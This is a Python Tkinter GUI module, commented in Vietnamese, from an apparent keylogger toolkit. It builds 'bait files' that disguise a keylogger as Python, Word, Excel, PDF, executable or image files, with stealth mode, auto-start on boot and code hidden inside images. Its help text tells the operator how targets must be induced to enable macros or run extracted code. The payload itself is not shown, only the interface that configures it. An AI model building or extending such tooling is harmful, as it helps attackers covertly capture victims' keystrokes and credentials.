#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module chứa BaitFrame - Giao diện tạo file mồi
"""

import os
import logging
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from typing import Optional, Callable, Dict, Any, Union

from gui.resources import UIResources

logger = logging.getLogger("keylogger.gui.bait_frame")

class BaitFrame:
    """Frame giao diện cho chức năng tạo file mồi."""
    
    def __init__(self, parent, callback: Optional[Callable] = None):
        """Khởi tạo frame tạo file mồi.
        
        Args:
            parent: Widget cha để chứa frame này
            callback: Hàm callback khi trạng thái thay đổi (tùy chọn)
        """
        self.parent = parent
        self.callback = callback
        self.target_file_path = ""
        self.progress_window = None
        
        # Biến tkinter
        self.log_path_var = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "keylog.txt"))
        self.bait_file_var = tk.StringVar(value="document.py")
        self.bait_type_var = tk.StringVar(value="Python (.py)")
        self.image_path_var = tk.StringVar()
        self.auto_start_var = tk.BooleanVar(value=False)
        self.stealth_mode_var = tk.BooleanVar(value=True)
        
        # Tạo giao diện
        self.create_widgets()
    
    def create_widgets(self):
        """Tạo các thành phần giao diện người dùng."""
        # Frame chính
        self.frame = ttk.Frame(self.parent)
        self.frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.frame.grid_columnconfigure(0, weight=1)
        self.frame.grid_rowconfigure(3, weight=1)
        
        # Tiêu đề
        title_frame = ttk.Frame(self.frame)
        title_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        title_label = ttk.Label(
            title_frame, text="TẠO FILE MỒI", font=("Arial", 16, "bold")
        )
        title_label.pack(pady=10)
        
        # Frame tùy chọn
        options_frame = ttk.LabelFrame(self.frame, text="Tùy chọn file mồi")
        options_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=5)
        
        # Đường dẫn lưu file log
        path_frame = ttk.Frame(options_frame)
        path_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Label(path_frame, text="Đường dẫn lưu log:").pack(side=tk.LEFT, padx=5)
        log_path_entry = ttk.Entry(path_frame, textvariable=self.log_path_var, width=40)
        log_path_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        browse_btn = ttk.Button(
            path_frame,
            text="Chọn",
            image=UIResources.get_icon_image("search"),
            compound=tk.LEFT,
            command=self.browse_log_path,
        )
        browse_btn.pack(side=tk.RIGHT, padx=5)
        
        # Tạo file mồi
        bait_frame = ttk.Frame(options_frame)
        bait_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Label(bait_frame, text="Tên file mồi:").pack(side=tk.LEFT, padx=5)
        bait_file_entry = ttk.Entry(
            bait_frame, textvariable=self.bait_file_var, width=20
        )
        bait_file_entry.pack(side=tk.LEFT, padx=5)
        
        # Thêm combobox cho các loại file mồi
        ttk.Label(bait_frame, text="Loại file:").pack(side=tk.LEFT, padx=15)
        bait_types = [
            "Python (.py)",
            "Word (.docx)",
            "Excel (.xlsx)",
            "PDF (.pdf)",
            "Thực thi (.exe)",
            "Hình ảnh (.jpg, .png)",
        ]
        bait_type_combobox = ttk.Combobox(
            bait_frame,
            textvariable=self.bait_type_var,
            values=bait_types,
            width=15,
            state="readonly",
        )
        bait_type_combobox.current(0)  # Default: Python
        bait_type_combobox.pack(side=tk.LEFT, padx=5)
        
        # Chế độ nâng cao
        advanced_frame = ttk.Frame(options_frame)
        advanced_frame.pack(fill=tk.X, padx=5, pady=10)
        
        auto_start_check = ttk.Checkbutton(
            advanced_frame,
            text="Tự khởi động cùng hệ thống",
            variable=self.auto_start_var,
        )
        auto_start_check.pack(side=tk.LEFT, padx=5)
        
        stealth_mode_check = ttk.Checkbutton(
            advanced_frame, text="Chế độ ẩn", variable=self.stealth_mode_var
        )
        stealth_mode_check.pack(side=tk.LEFT, padx=15)
        
        # Nút tạo file mồi
        btn_frame = ttk.Frame(options_frame)
        btn_frame.pack(fill=tk.X, padx=5, pady=10)
        
        create_icon = UIResources.get_icon_image("create")
        self.create_bait_btn = ttk.Button(
            btn_frame,
            text="Tạo file mồi",
            image=create_icon,
            compound=tk.LEFT,
            command=self.create_bait_file,
        )
        self.create_bait_btn.image = create_icon
        self.create_bait_btn.pack(side=tk.RIGHT, padx=5)
        
        # Frame cho tính năng nhúng mã vào ảnh
        embed_frame = ttk.LabelFrame(self.frame, text="Nhúng mã vào ảnh")
        embed_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
        
        # Chọn ảnh gốc
        image_frame = ttk.Frame(embed_frame)
        image_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ttk.Label(image_frame, text="Ảnh gốc:").pack(side=tk.LEFT, padx=5)
        image_path_entry = ttk.Entry(
            image_frame, textvariable=self.image_path_var, width=40
        )
        image_path_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        browse_img_btn = ttk.Button(
            image_frame,
            text="Chọn ảnh",
            image=UIResources.get_icon_image("search"),
            compound=tk.LEFT,
            command=self.browse_image,
        )
        browse_img_btn.pack(side=tk.RIGHT, padx=5)
        
        # Nút nhúng mã
        embed_btn_frame = ttk.Frame(embed_frame)
        embed_btn_frame.pack(fill=tk.X, padx=5, pady=10)
        
        embed_icon = UIResources.get_icon_image("key")
        embed_btn = ttk.Button(
            embed_btn_frame,
            text="Nhúng mã vào ảnh",
            image=embed_icon,
            compound=tk.LEFT,
            command=self.embed_to_image,
        )
        embed_btn.image = embed_icon
        embed_btn.pack(side=tk.RIGHT, padx=5)
        
        # Frame hiển thị hướng dẫn
        help_frame = ttk.LabelFrame(self.frame, text="Hướng dẫn")
        help_frame.grid(row=3, column=0, sticky="nsew", padx=10, pady=10)
        
        help_text = scrolledtext.ScrolledText(help_frame, wrap=tk.WORD, height=10)
        help_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Thêm nội dung hướng dẫn
        help_text.insert(tk.END, "HƯỚNG DẪN TẠO FILE MỒI\n\n")
        help_text.insert(tk.END, "1. File mồi Python (.py)\n")
        help_text.insert(tk.END, "   - Dễ tạo và hoạt động trên nhiều nền tảng\n")
        help_text.insert(tk.END, "   - Yêu cầu Python được cài đặt trên máy đích\n\n")
        help_text.insert(tk.END, "2. File mồi Word/Excel/PDF\n")
        help_text.insert(tk.END, "   - Phù hợp với môi trường văn phòng\n")
        help_text.insert(
            tk.END,
            "   - Yêu cầu người dùng kích hoạt macro (không thực sự hoạt động trong demo)\n\n",
        )
        help_text.insert(tk.END, "3. File thực thi (.exe)\n")
        help_text.insert(
            tk.END, "   - Hoạt động độc lập, không cần môi trường Python\n"
        )
        help_text.insert(tk.END, "   - Yêu cầu quyền quản trị trên Windows\n\n")
        help_text.insert(tk.END, "4. Nhúng mã vào ảnh\n")
        help_text.insert(tk.END, "   - Ẩn mã keylogger trong một ảnh thông thường\n")
        help_text.insert(
            tk.END, "   - Cần trích xuất và chạy đoạn mã sau khi nhận được ảnh\n"
        )
        help_text.insert(tk.END, "   - Ảnh nên đủ lớn để chứa mã (tối thiểu 50KB)\n")
        
        # Chỉnh kiểu cho tiêu đề
        help_text.tag_configure("title", font=("Arial", 11, "bold"))
        help_text.tag_add("title", "1.0", "1.end")
        help_text.config(state=tk.DISABLED)  # Không cho phép chỉnh sửa
    
    def browse_log_path(self):
        """Chọn đường dẫn lưu file log."""
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if path:
            self.log_path_var.set(path)
    
    def browse_image(self):
        """Chọn file ảnh để nhúng mã."""
        path = filedialog.askopenfilename(
            filetypes=[("Image files", "*.jpg *.jpeg *.png"), ("All files", "*.*")]
        )
        if path:
            self.image_path_var.set(path)
    
    def create_bait_file(self):
        """Tạo file mồi theo loại đã chọn."""
        file_name = self.bait_file_var.get()
        bait_type = self.bait_type_var.get()
        
        if not file_name:
            messagebox.showerror("Lỗi", "Vui lòng nhập tên file mồi!")
            return
        
        # Xác định loại file và phần mở rộng
        extension = ".py"  # Mặc định
        
        if "Word" in bait_type:
            extension = ".docx"
            required_packages = ["python-docx"]
        elif "Excel" in bait_type:
            extension = ".xlsx"
            required_packages = ["openpyxl"]
        elif "PDF" in bait_type:
            extension = ".pdf"
            required_packages = ["reportlab"]
        elif "Thực thi" in bait_type:
            extension = ".exe"
            required_packages = ["pyinstaller"]
        elif "Hình ảnh" in bait_type:
            # Cho người dùng chọn jpg hoặc png
            extension = ".png"  # Mặc định
            required_packages = ["numpy", "pillow"]
        else:
            required_packages = []
        
        # Nếu tên file không có phần mở rộng, thêm vào
        if not file_name.endswith(extension):
            file_name = file_name + extension
        
        # Cho phép người dùng chọn vị trí lưu file
        file_path = filedialog.asksaveasfilename(
            defaultextension=extension,
            filetypes=[
                (f"{bait_type.split('(')[0].strip()} files", f"*{extension}"),
                ("All files", "*.*"),
            ],
            initialfile=file_name,
        )
        
        if not file_path:
            return
        
        self.target_file_path = file_path
        
        # Lấy thông tin cài đặt
        log_path = self.log_path_var.get()
        stealth_mode = self.stealth_mode_var.get()
        auto_start = self.auto_start_var.get()
        
        # Gọi callback để thực hiện tạo file mồi
        if self.callback:
            self.callback({
                "action": "create_bait_file",
                "file_path": file_path,
                "log_path": log_path,
                "stealth_mode": stealth_mode,
                "auto_start": auto_start,
                "bait_type": bait_type,
                "required_packages": required_packages,
                "callback": self.on_bait_file_created
            })
    
    def on_bait_file_created(self, success: bool, message: str):
        """Xử lý sau khi tạo file mồi.
        
        Args:
            success: True nếu tạo thành công, False nếu thất bại
            message: Thông báo kết quả
        """
        if success:
            messagebox.showinfo("Thành công", message)
        else:
            messagebox.showerror("Lỗi", message)
    
    def embed_to_image(self):
        """Nhúng mã keylogger vào ảnh đã chọn."""
        # Kiểm tra xem người dùng đã chọn ảnh chưa
        image_path = self.image_path_var.get()
        if not image_path:
            messagebox.showerror("Lỗi", "Vui lòng chọn ảnh để nhúng mã!")
            return
        
        # Cho phép người dùng chọn vị trí lưu ảnh mới
        output_path = filedialog.asksaveasfilename(
            defaultextension=".png",
            filetypes=[("PNG files", "*.png"), ("All files", "*.*")],
            initialfile="hidden_code.png",
        )
        
        if not output_path:
            return
        
        # Lấy thông tin cài đặt
        log_path = self.log_path_var.get()
        stealth_mode = self.stealth_mode_var.get()
        auto_start = self.auto_start_var.get()
        
        # Gọi callback để thực hiện nhúng mã vào ảnh
        if self.callback:
            self.callback({
                "action": "embed_to_image",
                "source_image": image_path,
                "output_path": output_path,
                "log_path": log_path,
                "stealth_mode": stealth_mode,
                "auto_start": auto_start,
                "callback": self.on_image_created
            })
    
    def on_image_created(self, success: bool, message: str, output_path: Optional[str] = None):
        """Xử lý sau khi nhúng mã vào ảnh.
        
        Args:
            success: True nếu nhúng thành công, False nếu thất bại
            message: Thông báo kết quả
            output_path: Đường dẫn file ảnh đã nhúng mã (chỉ khi success=True)
        """
        if success:
            result = messagebox.askyesno(
                "Thành công", f"{message}\n\nBạn có muốn mở ảnh không?"
            )
            if result and output_path:
                if self.callback:
                    self.callback({
                        "action": "open_file",
                        "file_path": output_path
                    })
        else:
            messagebox.showerror("Lỗi", message)
    
    def get_frame(self):
        """Trả về frame chính để thêm vào container."""
        return self.frame